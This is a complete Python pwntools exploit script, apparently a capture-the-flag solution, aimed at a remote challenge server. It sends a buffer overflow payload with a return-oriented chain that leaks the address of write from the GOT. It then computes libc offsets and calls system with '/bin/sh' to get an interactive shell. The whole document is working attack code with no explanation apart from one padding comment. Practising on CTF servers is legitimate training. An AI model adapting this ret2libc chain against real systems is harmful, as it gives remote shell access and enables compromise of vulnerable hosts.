#!/usr/bin/env python
# coding=utf-8
from pwn import*
s=remote('pwn2.jarvisoj.com',9883)

a='A'*0x88     #填充数据
write_plt=0x4004b0
write_got=0x600a58
funwr=0x4005e6
poprdi=0x4006b3
poprsi=0x4006b1
payload=a+p64(poprdi)+p64(1)+p64(poprsi)+p64(write_got)+p64(233)+p64(write_plt)+p64(funwr)

s.recvline()
s.sendline(payload)
writeaddr=u64(s.recv(8))

libc_write=0xeb700
libc_sys=0x46590
libc_bin=0x17c8c3
addr=writeaddr-libc_write

sys=addr+libc_sys
shell=addr+libc_bin

payload=a+p64(poprdi)+p64(shell)+p64(sys)

s.sendline(payload)
s.interactive()
